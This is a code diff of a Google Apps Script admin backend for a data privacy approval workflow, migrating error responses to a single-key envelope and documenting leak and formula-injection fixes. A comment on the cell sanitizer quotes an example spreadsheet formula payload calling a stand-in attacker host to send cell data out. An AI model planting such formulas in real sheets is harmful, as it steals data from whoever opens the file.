 function getStyledHtmlWrapper_(headerContent, bodyContent) {
@@ -3372,7 +3378,7 @@ function getStyledHtmlWrapper_(headerContent, bodyContent) {
   '<style>' +
   '*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}' +
   '@import url("https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;1,9..40,300&family=DM+Mono:wght@400;500&display=swap");' +
-  // GENERATED from docs/design-tokens.css — the block an APPROVER sees on the page they land
+  // GENERATED from docs/design-tokens.css, the block an APPROVER sees on the page they land
   // on from an email link. Minified into a concatenated string because this is served, not
   // authored. Edit the canonical file, then paste into all 6 targets.
   ':root{' +
@@ -3436,7 +3442,7 @@ function getStyledHtmlWrapper_(headerContent, bodyContent) {
              characters.
   TECHNICAL: Replaces & < > " ' with their HTML entities. Used throughout the email
              and access-denied HTML builders.
-  PARAMS:    - str — any value (coerced to string).
+  PARAMS:    - str: any value (coerced to string).
   RETURNS:   Escaped string.
 */
 function escapeHtml_(str) {
@@ -3452,28 +3458,37 @@ function escapeHtml_(str) {
   ━━━ THE ERROR CONTRACT (F-06) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
   LAYMAN:    When something broke, the server used to hand Google's exact error message
-             straight to the browser — and those messages quote the spreadsheet ID and the
+             straight to the browser, and those messages quote the spreadsheet ID and the
              Drive folder ID. One broken request was enough to leak them. Now the real
              error goes to the log and the user gets a clean sentence plus a short
              reference code. They read you the code, you find the full detail in the log.
 
-  TECHNICAL: Closes F-06 (CWE-200). 89 catch blocks across the three projects returned
+  TECHNICAL: Closes F-06 (CWE-200). 110 catch blocks across the three projects returned
              `error: e.toString()`; GAS exceptions echo the offending resource ID.
 
-  🚩 THE ENVELOPE IS DUAL-KEY, ON PURPOSE, FOR ONE RELEASE:
-       { ok:false, code:'NOT_FOUND', message:'…', ref:'7f3a91',
-         success:false, error:'…' }        <- legacy pair, delete next release
-     `ok`/`code`/`message` are the contract going forward; `success`/`error` are kept so an
-     unmigrated frontend call site keeps working rather than rendering "undefined" at a
-     user. The three GAS projects deploy independently, so a backend/frontend version skew
-     is the normal case, not an edge case. Drop the legacy pair from all three at once.
+  🚩 THE ENVELOPE IS SINGLE-KEY (since 2026-08-12):
+       { ok:false, code:'NOT_FOUND', message:'…', ref:'7f3a91' }
+     It shipped dual-key for exactly one release, carrying a legacy `success`/`error` pair
+     beside these, so an unmigrated frontend call site kept working rather than rendering
+     "undefined" at a user. The three GAS projects deploy independently, so a
+     backend/frontend version skew is the normal case, not an edge case. That pair is now
+     gone from all three backends and all three frontends.
 
-  ⚠️ The real exception goes to Logger.log ONLY — deliberately not to Risk_Audit. An audit
+     ⚠️ A `success` or `error` key still present here is NOT this envelope: the `flags.error`
+        inside audit JSON, `Email_Queue.Last_Error` surfaced by adminGetEmailLog /
+        adminGetFailedEmails, and every `Logger.log('... error: ' + e)` label are unrelated.
+
+  🚩 This sweep was incomplete on its first pass, and the reason generalizes. The original
+     pattern matched only a value that STARTED with the exception identifier, so 21 sites
+     shaped `error: 'Loading failed: ' + e.message` survived it. Admin held the majority of
+     them, every getAdminData handler included. Match the CONCATENATED form too.
+
+  ⚠️ The real exception goes to Logger.log ONLY, deliberately not to Risk_Audit. An audit
      row per error is the log-bloat pattern this repo avoids elsewhere, and a sheet write
      inside an error handler is a second failure waiting to happen. Stackdriver already
      retains it, keyed by `ref`.
 
-  Kept deliberately identical to the copies in Phase 1/Code.js and Phase 2/pia_code.js —
+  Kept deliberately identical to the copies in Phase 1/Code.js and Phase 2/pia_code.js,
   separate GAS projects cannot share code, so the three must be edited together.
 */
 var ERR = {
@@ -3503,13 +3518,13 @@ var ERR_MESSAGES = {
   LAYMAN:    Builds the one standard "it did not work" reply used everywhere.
   TECHNICAL: Unknown codes degrade to INTERNAL rather than emitting a code the frontend
              cannot interpret.
-  PARAMS:    - code — one of ERR.*.   - message — optional wording override.
-  RETURNS:   { ok:false, code, message, success:false, error }.
+  PARAMS:    - code: one of ERR.*.   - message: optional wording override.
+  RETURNS:   { ok:false, code, message }.
 */
 function fail_(code, message) {
   var c = Object.prototype.hasOwnProperty.call(ERR_MESSAGES, code) ? code : ERR.INTERNAL;
   var m = message || ERR_MESSAGES[c];
-  return { ok: false, code: c, message: m, success: false, error: m };
+  return { ok: false, code: c, message: m };
 }
 
 /*
@@ -3519,8 +3534,8 @@ function fail_(code, message) {
              bridge: the user quotes it, you search the log for it.
   TECHNICAL: Logs `[ref] CODE :: stack`, then returns fail_() with the ref appended to the
              public message. NEVER put e.toString()/e.message into the returned object.
-  PARAMS:    - e — the caught exception.  - code — one of ERR.* (default INTERNAL).
-             - publicMessage — optional user-facing override.
+  PARAMS:    - e: the caught exception.  - code: one of ERR.* (default INTERNAL).
+             - publicMessage: optional user-facing override.
   RETURNS:   The dual-key failure envelope, plus a `ref` field.
   EXAMPLE
     } catch (e) { return safeError_(e, ERR.INTERNAL); }
@@ -3532,7 +3547,6 @@ function safeError_(e, code, publicMessage) {
   var out = fail_(code || ERR.INTERNAL, publicMessage);
   out.ref = ref;
   out.message = out.message + ' Reference: ' + ref;
-  out.error = out.message;   // legacy key mirrors the new one for the transition window
   return out;
 }
 
@@ -3541,7 +3555,7 @@ function safeError_(e, code, publicMessage) {
 
   LAYMAN (Tropang Ex):
   Pang-kontra "formula injection" ito. Sa Google Sheets, kapag nagsimula ang laman ng
-  isang cell sa `=`, hindi na yun text — FORMULA na yun, at tatakbo pagbukas ng file.
+  isang cell sa `=`, hindi na yun text: FORMULA na yun, at tatakbo pagbukas ng file.
   So kung may nag-type sa DCS form ng `=IMPORTXML("evil.com?d="&A1)`, tahimik lang yun
   habang nasa database. Pero pag-export ng admin at binuksan niya yung bagong Sheet,
   tatakbo yun gamit ang ACCOUNT NIYA. Ang ginagawa nito: nilalagyan ng apostrophe (')
@@ -3556,14 +3570,14 @@ function safeError_(e, code, publicMessage) {
   plain-text marker: it is not rendered, and getValue()/getValues() return the string
   WITHOUT it, so the transformation is lossless on round-trip.
 
-  🚩 SCOPE: applied at the export boundary ONLY — see exportToSheet. It is deliberately
+  🚩 SCOPE: applied at the export boundary ONLY, see exportToSheet. It is deliberately
   NOT applied to live-database writes. Those cells are read back by code (where '=' is
   an inert string, not a formula) and several of them are JSON.parse'd, so injecting a
   marker character into the stored value would be a correctness risk with no security
   gain. The export is the only artifact a human opens in the Sheets UI.
 
   PARAMS:
-  - v — any value. Non-strings are returned untouched so numbers and Dates keep their
+  - v: any value. Non-strings are returned untouched so numbers and Dates keep their
         native cell type.
 
   RETURNS:
@@ -3581,16 +3595,16 @@ function sanitizeCellValue_(v) {
 
 /*
   Function: sendEmailWithRetry_
-  LAYMAN:    Sends an email, and if Gmail hiccups, waits and tries again — up to five
-             times — before giving up. The single choke point every Admin email goes
+  LAYMAN:    Sends an email, and if Gmail hiccups, waits and tries again, up to five
+             times, before giving up. The single choke point every Admin email goes
              through.
   TECHNICAL: Calls MailApp.sendEmail up to 5 times with increasing backoff
              (5s,10s,15s,20s; ~75s total incl. API overhead). Returns true on success;
              re-throws the last error after the final attempt so callers can log
              'Email Failed'.
-  PARAMS:    - recipients — comma-joined address string.
-             - subject, plainText — message basics.
-             - options — MailApp options (htmlBody, replyTo, attachments, ...).
+  PARAMS:    - recipients: comma-joined address string.
+             - subject, plainText, message basics.
+             - options: MailApp options (htmlBody, replyTo, attachments, ...).
   RETURNS:   true on success (throws if all attempts fail).
 */
 function sendEmailWithRetry_(recipients, subject, plainText, options) {
@@ -3624,24 +3638,24 @@ function sendEmailWithRetry_(recipients, subject, plainText, options) {
              DivisionHead_Approval_Workflow, derives canRoute from status + ISM/DH
              approval, pulls dcops/techserve emails from active InfoSec_Email_Config
              rows, and joins DCS metadata for display.
-  PARAMS:    - sessionId — required.
-  RETURNS:   {success:true, data:{...routing snapshot...}} or {success:false, error}.
+  PARAMS:    - sessionId: required.
+  RETURNS:   {ok: true, data:{...routing snapshot...}} or {ok: false, message}.
 
   STEPS
-    Step 1 — Read the application (404 if missing).
-    Step 2 — Tally ISM approvals + last routing destination.
-    Step 3 — Read Division Head decision.
-    Step 4 — Compute routing eligibility.
-    Step 5-6 — Resolve destination emails + DCS display fields.
+    Step 1: Read the application (404 if missing).
+    Step 2: Tally ISM approvals + last routing destination.
+    Step 3: Read Division Head decision.
+    Step 4: Compute routing eligibility.
+    Step 5-6: Resolve destination emails + DCS display fields.
 */
 function apiAdmin_GetRoutingStatus(sessionId) {
   // SECURITY: re-authorize the caller (see adminApi_getEmailQueue).
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
   try {
     if (!sessionId || String(sessionId).trim() === '') {
-      return { ok: false, success: false, error: 'Session ID is required.' };
+      return { ok: false, message: 'Session ID is required.' };
     }
     sessionId = String(sessionId).trim();
 
@@ -3668,7 +3682,7 @@ function apiAdmin_GetRoutingStatus(sessionId) {
     }
 
     if (!appRow) {
-      return { ok: false, success: false, error: 'Application not found for Session ID: ' + sessionId };
+      return { ok: false, message: 'Application not found for Session ID: ' + sessionId };
     }
 
     var status = String(appRow.Status || 'Unknown');
@@ -3786,7 +3800,7 @@ function apiAdmin_GetRoutingStatus(sessionId) {
     try { pia1 = JSON.parse(appRow.PIA_1_Data || '{}'); } catch (e) {}
 
     return {
-      ok: true, success: true,
+      ok: true,
       data: {
         sessionId: sessionId,
         status: status,
@@ -3818,14 +3832,14 @@ function apiAdmin_GetRoutingStatus(sessionId) {
     };
   } catch (e) {
     Logger.log('[ADMIN] Error in apiAdmin_GetRoutingStatus: ' + e.toString());
-    return { ok: false, success: false, error: 'apiAdmin_GetRoutingStatus: ' + e.toString() };
+    return safeError_(e, ERR.INTERNAL);
   }
 }
 
 /*
   Function: apiAdmin_RerouteApprovedRequest
   LAYMAN:    Re-creates the Certificate of Approval for an approved request and emails
-             it (with a PDF copy) to the implementation team — DCOPS, TechServe, or
+             it (with a PDF copy) to the implementation team: DCOPS, TechServe, or
              both. The admin uses this to (re)route a finished request.
   TECHNICAL: Validates destination in {DCOPS,TECHSERVE,BOTH}; a 30s per
              session+destination idempotency cache (on the function object) blocks
@@ -3834,48 +3848,48 @@ function apiAdmin_GetRoutingStatus(sessionId) {
              InfoSec destination emails, and approval rows, builds the certificate via
              buildCertificateHtml_, attaches a generated PDF, sends through
              sendEmailWithRetry_, and writes an ADMIN_REROUTE audit row.
-  PARAMS:    - sessionId — required.
-             - destination — 'DCOPS' | 'TECHSERVE' | 'BOTH'.
-             - force — optional; bypass the idempotency cache.
-  RETURNS:   {success:true, message, sentTo, destination, certificateFile}
-             or {success:false, error}.
+  PARAMS:    - sessionId: required.
+             - destination: 'DCOPS' | 'TECHSERVE' | 'BOTH'.
+             - force: optional; bypass the idempotency cache.
+  RETURNS:   {ok: true, message, sentTo, destination, certificateFile}
+             or {ok: false, message}.
 
   STEPS
-    Step 0 — Validate inputs + idempotency cache.
-    Step 1 — Read application; confirm routable status (incl. DH approval).
-    Step 2-3 — Read DCS metadata + InfoSec destination/ISM emails.
-    Step 4 — Resolve recipient list for the chosen destination.
-    Step 5-6 — Build approver tables + certificate HTML.
-    Step 7-8 — Generate PDF + send the email.
-    Step 9 — Log ADMIN_REROUTE audit entry.
+    Step 0: Validate inputs + idempotency cache.
+    Step 1: Read application; confirm routable status (incl. DH approval).
+    Step 2-3: Read DCS metadata + InfoSec destination/ISM emails.
+    Step 4: Resolve recipient list for the chosen destination.
+    Step 5-6: Build approver tables + certificate HTML.
+    Step 7-8: Generate PDF + send the email.
+    Step 9: Log ADMIN_REROUTE audit entry.
 */
 function apiAdmin_RerouteApprovedRequest(sessionId, destination, force) {
-  // SECURITY: re-authorize the caller — regenerates a certificate and emails DCOPS/TechServe; require INFOSEC.
+  // SECURITY: re-authorize the caller, regenerates a certificate and emails DCOPS/TechServe; require INFOSEC.
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
   try {
     if (!sessionId || String(sessionId).trim() === '') {
-      return { ok: false, success: false, error: 'Session ID is required.' };
+      return { ok: false, message: 'Session ID is required.' };
     }
     sessionId = String(sessionId).trim();
 
     if (!destination || String(destination).trim() === '') {
-      return { ok: false, success: false, error: 'Destination is required (DCOPS, TECHSERVE, or BOTH).' };
+      return { ok: false, message: 'Destination is required (DCOPS, TECHSERVE, or BOTH).' };
     }
     var normalizedDest = String(destination).toUpperCase().trim();
     var validDests = ['DCOPS', 'TECHSERVE', 'BOTH'];
     if (validDests.indexOf(normalizedDest) === -1) {
-      return { ok: false, success: false, error: 'Invalid destination: ' + destination + '. Must be DCOPS, TECHSERVE, or BOTH.' };
+      return { ok: false, message: 'Invalid destination: ' + destination + '. Must be DCOPS, TECHSERVE, or BOTH.' };
     }
 
-    // Idempotency check — skip if force=true (admin recovery resend)
+    // Idempotency check: skip if force=true (admin recovery resend)
     if (!force) {
       var cache = apiAdmin_RerouteApprovedRequest._rerouteCache || (apiAdmin_RerouteApprovedRequest._rerouteCache = {});
       var cacheKey = sessionId + '::' + normalizedDest;
       var now = Date.now();
       if (cache[cacheKey] && (now - cache[cacheKey] < 30000)) {
-        return { ok: false, success: false, error: 'Duplicate request detected. Please wait 30 seconds before re-sending to ' + normalizedDest + '.' };
+        return { ok: false, message: 'Duplicate request detected. Please wait 30 seconds before re-sending to ' + normalizedDest + '.' };
       }
       cache[cacheKey] = now;
     }
@@ -3903,7 +3917,7 @@ function apiAdmin_RerouteApprovedRequest(sessionId, destination, force) {
     }
 
     if (!appRow) {
-      return { ok: false, success: false, error: 'Application not found for Session ID: ' + sessionId };
+      return { ok: false, message: 'Application not found for Session ID: ' + sessionId };
     }
 
     // Check that app is in an approved/routable state
@@ -3926,7 +3940,7 @@ function apiAdmin_RerouteApprovedRequest(sessionId, destination, force) {
     }
 
     if (!isRoutableStatus) {
-      return { ok: false, success: false, error: 'Application status is "' + status + '". Must be "Approved", "Approved by ISM", or Div Head approved to route.' };
+      return { ok: false, message: 'Application status is "' + status + '". Must be "Approved", "Approved by ISM", or Div Head approved to route.' };
     }
 
     var pia1 = {};
@@ -4004,7 +4018,7 @@ function apiAdmin_RerouteApprovedRequest(sessionId, destination, force) {
       }
     }
     if (validEmails.length === 0) {
-      return { ok: false, success: false, error: 'No destination emails configured for ' + normalizedDest + '. Please check InfoSec_Email_Config sheet.' };
+      return { ok: false, message: 'No destination emails configured for ' + normalizedDest + '. Please check InfoSec_Email_Config sheet.' };
     }
     var recipients = validEmails.join(',');
 
@@ -4147,7 +4161,7 @@ function apiAdmin_RerouteApprovedRequest(sessionId, destination, force) {
     Logger.log('[ADMIN] ' + sessionId + ': Request re-routed to ' + normalizedDest + ': ' + recipients);
 
     return {
-      ok: true, success: true,
+      ok: true,
       message: 'Certificate regenerated and successfully sent to ' + normalizedDest,
       sentTo: recipients,
       destination: normalizedDest,
@@ -4162,8 +4176,8 @@ function apiAdmin_RerouteApprovedRequest(sessionId, destination, force) {
 
 /*
   Function: apiAdmin_GetApprovedApplications
-  LAYMAN:    Builds the full list for the Email Routing page — every application with
-             its status, ISM/Division-Head progress, and whether it's ready to route —
+  LAYMAN:    Builds the full list for the Email Routing page, every application with
+             its status, ISM/Division-Head progress, and whether it's ready to route,
              sorted so the ones most ready to send sit at the top.
   TECHNICAL: Reads Applications and groups ISM + DivHead workflow rows by SessionID,
              plus DCS metadata by ReqID and InfoSec destination emails. Per app
@@ -4171,19 +4185,19 @@ function apiAdmin_RerouteApprovedRequest(sessionId, destination, force) {
              canRoute, then sorts by a route-readiness weight (0=ready ... 9=terminal),
              tiebreaking on sessionId.
   PARAMS:    (none)
-  RETURNS:   {success:true, data:[appSummary...]} or {success:false, error}.
+  RETURNS:   {ok: true, data:[appSummary...]} or {ok: false, message}.
 */
 function apiAdmin_GetApprovedApplications() {
   // SECURITY: re-authorize the caller (see adminApi_getEmailQueue).
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
   try {
     var ss = getSpreadsheet_();
 
     // ── Read Applications ──
     var appSheet = ss.getSheetByName(SHEET_NAMES.APPLICATIONS);
-    if (!appSheet) return { ok: false, success: false, error: 'Applications sheet not found.' };
+    if (!appSheet) return { ok: false, message: 'Applications sheet not found.' };
     var appRows = sheetToObjects_(appSheet);
 
     // ── Read ISM approvals ──
@@ -4343,13 +4357,13 @@ function apiAdmin_GetApprovedApplications() {
 
     // Sort: most-ready-to-route first
     var sortWeight = function(item) {
-      // 0: Fully approved by ISM — ready to route
+      // 0: Fully approved by ISM, ready to route
       if (item.status === 'Approved by ISM') return 0;
       // 1: Approved + all ISM approved (effectively Approved by ISM)
       if (item.status === 'Approved' && item.allIsmApproved) return 1;
-      // 2: Escalated + Div Head approved — ready to resume/route
+      // 2: Escalated + Div Head approved, ready to resume/route
       if (item.ismEscalated && item.dhApproved) return 2;
-      // 3: Approved (ISM Pending) — needs admin fix
+      // 3: Approved (ISM Pending), needs admin fix
       if (item.status === 'Approved (ISM Pending)') return 3;
       // 4: Escalated to Division Head (pending DH)
       if (item.status === 'Escalated to Division Head' && !item.dhApproved) return 4;
@@ -4370,7 +4384,7 @@ function apiAdmin_GetApprovedApplications() {
       return a.sessionId.localeCompare(b.sessionId);
     });
 
-    return { ok: true, success: true, data: results };
+    return { ok: true, data: results };
 
   } catch (e) {
     Logger.log('[ADMIN] Error in apiAdmin_GetApprovedApplications: ' + e.toString());
@@ -4381,22 +4395,22 @@ function apiAdmin_GetApprovedApplications() {
 /*
   Function: apiAdmin_DownloadCertificate
   LAYMAN:    Generates the Certificate of Approval PDF and hands it straight back to
-             the browser for download — no email sent.
+             the browser for download, no email sent.
   TECHNICAL: Mirrors the data-gathering of apiAdmin_RerouteApprovedRequest (app, DCS
              metadata, approver tables), builds the certificate via
              buildCertificateHtml_, renders a PDF, and returns it base64-encoded.
              Does not enforce the routable-status gate.
-  PARAMS:    - sessionId — required.
-  RETURNS:   {success:true, data:{fileName, base64, mimeType}} or {success:false, error}.
+  PARAMS:    - sessionId: required.
+  RETURNS:   {ok: true, data:{fileName, base64, mimeType}} or {ok: false, message}.
 */
 function apiAdmin_DownloadCertificate(sessionId) {
-  // SECURITY: re-authorize the caller — returns a certificate PDF; require INFOSEC.
+  // SECURITY: re-authorize the caller, returns a certificate PDF; require INFOSEC.
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
   try {
     if (!sessionId || String(sessionId).trim() === '') {
-      return { ok: false, success: false, error: 'Session ID is required.' };
+      return { ok: false, message: 'Session ID is required.' };
     }
     sessionId = String(sessionId).trim();
 
@@ -4421,7 +4435,7 @@ function apiAdmin_DownloadCertificate(sessionId) {
         }
       }
     }
-    if (!appRow) return { ok: false, success: false, error: 'Application not found.' };
+    if (!appRow) return { ok: false, message: 'Application not found.' };
 
     var pia1 = {};
     try { pia1 = JSON.parse(appRow.PIA_1_Data || '{}'); } catch (e) {}
@@ -4545,7 +4559,7 @@ function apiAdmin_DownloadCertificate(sessionId) {
     var pdfBase64 = Utilities.base64Encode(pdfBlob.getBytes());
 
     return {
-      ok: true, success: true,
+      ok: true,
       data: {
         fileName: 'Approval_Certificate_' + sessionId + '.pdf',
         base64: pdfBase64,
@@ -4568,7 +4582,7 @@ function apiAdmin_DownloadCertificate(sessionId) {
              optionally a CTA button (ctaText+ctaUrl), and a footer. Pass the result as
              options.htmlBody to sendEmailWithRetry_, keeping a plain-text fallback for
              non-HTML clients. Matches the navy palette of buildCertificateHtml_.
-  PARAMS:    - opts — {heading, accent, intro, bodyHtml, detailRows:[[label,value]...],
+  PARAMS:    - opts: {heading, accent, intro, bodyHtml, detailRows:[[label,value]...],
              ctaText, ctaUrl, footerNote}; all optional.
   RETURNS:   HTML string.
 */
@@ -4605,7 +4619,7 @@ function buildAdminEmailHtml_(opts) {
   LAYMAN:    Reads an optional link from settings for email buttons. If it's not set,
              returns '' so the button is simply left out.
   TECHNICAL: Safe getter over a URL Script Property; '' on missing or error.
-  PARAMS:    - key — property name (e.g. 'WEB_APP_URL').
+  PARAMS:    - key: property name (e.g. 'WEB_APP_URL').
   RETURNS:   URL string or ''.
 */
 function getOptionalUrl_(key) {
@@ -4614,7 +4628,7 @@ function getOptionalUrl_(key) {
 
 /*
   Function: buildCertificateHtml_
-  LAYMAN:    Builds the full "Certificate of Approval" HTML — the formal document
+  LAYMAN:    Builds the full "Certificate of Approval" HTML, the formal document
              showing the request brief, agency info, and every approver who signed off.
              Shared by both the reroute-email and download-PDF paths.
   TECHNICAL: Pure string builder. Renders an application-brief table, an optional
@@ -4701,9 +4715,9 @@ function buildCertificateHtml_(sessionId, pia1, linkedReqId, applicantEmail,
   TECHNICAL: Appends to Risk_Audit: [UUID LogID, sessionId, flagsJson InternalFlags,
              action, active-user email, 'Email System' UserAgent, ISO timestamp].
              flagsObj is JSON-stringified if not already a string. Silent on failure.
-  PARAMS:    - sessionId — session/application ID.
-             - action — e.g. 'Email Sent' | 'Email Failed' | 'Email Resend'.
-             - flagsObj — {recipient, type, attempts, error}.
+  PARAMS:    - sessionId: session/application ID.
+             - action: e.g. 'Email Sent' | 'Email Failed' | 'Email Resend'.
+             - flagsObj: {recipient, type, attempts, error}.
   RETURNS:   undefined.
 */
 function logAuditTrail_(sessionId, action, flagsObj) {
@@ -4733,7 +4747,7 @@ function logAuditTrail_(sessionId, action, flagsObj) {
              isn't one.
   TECHNICAL: Reads Applications via sheetToObjects_ and returns the first row whose
              SessionID matches; null on any error.
-  PARAMS:    - sessionId — session/application ID.
+  PARAMS:    - sessionId: session/application ID.
   RETURNS:   Row object or null.
 */
 function getApplicationData_(sessionId) {
@@ -4762,20 +4776,20 @@ function getApplicationData_(sessionId) {
              builds program context from the app's PIA_1_Data, sends a navy
              buildAdminEmailHtml_ message via sendEmailWithRetry_, and logs
              'Email Sent' / 'Email Failed'. Fully try/catch wrapped.
-  PARAMS:    - sessionId — session/application ID.
-             - stepIndex — 0-based index into the session's workflow rows.
-  RETURNS:   {success:true} or {success:false, error}.
+  PARAMS:    - sessionId: session/application ID.
+             - stepIndex: 0-based index into the session's workflow rows.
+  RETURNS:   {ok: true,} or {ok: false, message}.
 */
 function notifyApprover_(sessionId, stepIndex) {
   try {
     var ss = getSpreadsheet_();
     var awSheet = ss.getSheetByName(SHEET_NAMES.APPROVAL_WORKFLOW);
-    if (!awSheet) return { ok: false, success: false, error: 'Approval_Workflow sheet not found.' };
+    if (!awSheet) return { ok: false, message: 'Approval_Workflow sheet not found.' };
 
     // Read all workflow rows for this session
     var awRows = sheetToObjectsFiltered_(awSheet, 'SessionID', sessionId);
     if (stepIndex < 0 || stepIndex >= awRows.length) {
-      return { ok: false, success: false, error: 'Step index ' + stepIndex + ' out of range (0-' + (awRows.length - 1) + ').' };
+      return { ok: false, message: 'Step index ' + stepIndex + ' out of range (0-' + (awRows.length - 1) + ').' };
     }
 
     var step = awRows[stepIndex];
@@ -4784,7 +4798,7 @@ function notifyApprover_(sessionId, stepIndex) {
     var currentStep   = String(step.CurrentStep || '').trim();
 
     if (!approverEmail) {
-      return { ok: false, success: false, error: 'No approver email found at step ' + stepIndex + '.' };
+      return { ok: false, message: 'No approver email found at step ' + stepIndex + '.' };
     }
 
     // Build application context
@@ -4800,11 +4814,11 @@ function notifyApprover_(sessionId, stepIndex) {
       '  Session ID: ' + sessionId + '\n' +
       '  Step: ' + (currentStep || stepIndex + 1) + '\n\n' +
       'Please log in to the Data Privacy System to review and make your decision.\n\n' +
-      '— Data Privacy Admin System';
+      'Data Privacy Admin System';
 
     var flags = { recipient: approverEmail, type: 'approver', attempts: 1, error: null };
     var htmlBody = buildAdminEmailHtml_({
-      heading: 'Action Required — Approval',
+      heading: 'Action Required: Approval',
       intro: 'Dear ' + approverName + ',',
       bodyHtml: 'You have a <strong>pending approval</strong> awaiting your decision.',
       detailRows: [['Program', programName], ['Session ID', sessionId], ['Step', (currentStep || stepIndex + 1)]],
@@ -4814,7 +4828,7 @@ function notifyApprover_(sessionId, stepIndex) {
     try {
       sendEmailWithRetry_(approverEmail, subject, body, { htmlBody: htmlBody, replyTo: Session.getActiveUser().getEmail() });
       logAuditTrail_(sessionId, 'Email Sent', flags);
-      return { ok: true, success: true };
+      return { ok: true };
     } catch (sendErr) {
       flags.error = sendErr.toString();
       logAuditTrail_(sessionId, 'Email Failed', flags);
@@ -4833,31 +4847,31 @@ function notifyApprover_(sessionId, stepIndex) {
   TECHNICAL: Looks up the app + applicant email, derives an accent color from the
              status keyword, sends a buildAdminEmailHtml_ message via
              sendEmailWithRetry_, and logs the audit row. Try/catch wrapped.
-  PARAMS:    - sessionId — session/application ID.
-             - currentStatus — display status; falls back to app.Status / 'Updated'.
-  RETURNS:   {success:true} or {success:false, error}.
+  PARAMS:    - sessionId: session/application ID.
+             - currentStatus: display status; falls back to app.Status / 'Updated'.
+  RETURNS:   {ok: true,} or {ok: false, message}.
 */
 function notifyApplicant_(sessionId, currentStatus) {
   try {
     var app = getApplicationData_(sessionId);
-    if (!app) return { ok: false, success: false, error: 'Application not found for session ' + sessionId + '.' };
+    if (!app) return { ok: false, message: 'Application not found for session ' + sessionId + '.' };
 
     var applicantEmail = String(app.ApplicantEmail || '').trim();
-    if (!applicantEmail) return { ok: false, success: false, error: 'No applicant email on record.' };
+    if (!applicantEmail) return { ok: false, message: 'No applicant email on record.' };
 
     var pia1 = {};
     try { pia1 = JSON.parse(app.PIA_1_Data || '{}'); } catch (e) {}
     var programName = pia1.program || 'Data Privacy Request';
 
     var statusDisplay = currentStatus || String(app.Status || 'Updated');
-    var subject = '[STATUS UPDATE] ' + programName + ' — ' + statusDisplay;
+    var subject = '[STATUS UPDATE] ' + programName + ': ' + statusDisplay;
     var body = 'Dear Applicant,\n\n' +
       'Your request status has been updated:\n\n' +
       '  Program: ' + programName + '\n' +
       '  Session ID: ' + sessionId + '\n' +
       '  Status: ' + statusDisplay + '\n\n' +
       'Please log in to the Data Privacy System for more details.\n\n' +
-      '— Data Privacy Admin System';
+      'Data Privacy Admin System';
 
     var flags = { recipient: applicantEmail, type: 'applicant', attempts: 1, error: null };
     var sLower = String(statusDisplay).toLowerCase();
@@ -4875,7 +4889,7 @@ function notifyApplicant_(sessionId, currentStatus) {
     try {
       sendEmailWithRetry_(applicantEmail, subject, body, { htmlBody: htmlBody, replyTo: Session.getActiveUser().getEmail() });
       logAuditTrail_(sessionId, 'Email Sent', flags);
-      return { ok: true, success: true };
+      return { ok: true };
     } catch (sendErr) {
       flags.error = sendErr.toString();
       logAuditTrail_(sessionId, 'Email Failed', flags);
@@ -4895,15 +4909,15 @@ function notifyApplicant_(sessionId, currentStatus) {
              (1-based), builds program context, sends a buildAdminEmailHtml_ message
              via sendEmailWithRetry_, and logs 'Email Sent' / 'Email Failed'.
              Try/catch wrapped.
-  PARAMS:    - sessionId — session/application ID.
-             - stepNumber — 1-based step matching the CurrentStep column.
-  RETURNS:   {success:true} or {success:false, error}.
+  PARAMS:    - sessionId: session/application ID.
+             - stepNumber: 1-based step matching the CurrentStep column.
+  RETURNS:   {ok: true,} or {ok: false, message}.
 */
 function apiPhase3_NotifyISMember_(sessionId, stepNumber) {
   try {
     var ss = getSpreadsheet_();
     var ismSheet = ss.getSheetByName(SHEET_NAMES.ISM_APPROVAL);
-    if (!ismSheet) return { ok: false, success: false, error: 'ISM_Approval_Workflow sheet not found.' };
+    if (!ismSheet) return { ok: false, message: 'ISM_Approval_Workflow sheet not found.' };
 
     var ismRows = sheetToObjectsFiltered_(ismSheet, 'SessionID', sessionId);
     // stepNumber is 1-based (maps to CurrentStep column)
@@ -4916,14 +4930,14 @@ function apiPhase3_NotifyISMember_(sessionId, stepNumber) {
       }
     }
     if (!targetStep) {
-      return { ok: false, success: false, error: 'No ISM step found at step ' + stepNumber + ' for session ' + sessionId + '.' };
+      return { ok: false, message: 'No ISM step found at step ' + stepNumber + ' for session ' + sessionId + '.' };
     }
 
     var ismEmail = String(targetStep.ISM_Member_Email || '').trim();
     var ismName  = String(targetStep.ISM_Member_Name || ismEmail || 'ISM Member').trim();
 
     if (!ismEmail) {
-      return { ok: false, success: false, error: 'No ISM member email at step ' + stepNumber + '.' };
+      return { ok: false, message: 'No ISM member email at step ' + stepNumber + '.' };
     }
 
     var app = getApplicationData_(sessionId);
@@ -4938,7 +4952,7 @@ function apiPhase3_NotifyISMember_(sessionId, stepNumber) {
       '  Session ID: ' + sessionId + '\n' +
       '  Step: ' + stepNumber + '\n\n' +
       'Please log in to the Data Privacy System to review and make your decision.\n\n' +
-      '— Data Privacy Admin System';
+      'Data Privacy Admin System';
 
     var flags = { recipient: ismEmail, type: 'ism', attempts: 1, error: null };
     var htmlBody = buildAdminEmailHtml_({
@@ -4952,7 +4966,7 @@ function apiPhase3_NotifyISMember_(sessionId, stepNumber) {
     try {
       sendEmailWithRetry_(ismEmail, subject, body, { htmlBody: htmlBody, replyTo: Session.getActiveUser().getEmail() });
       logAuditTrail_(sessionId, 'Email Sent', flags);
-      return { ok: true, success: true };
+      return { ok: true };
     } catch (sendErr) {
       flags.error = sendErr.toString();
       logAuditTrail_(sessionId, 'Email Failed', flags);
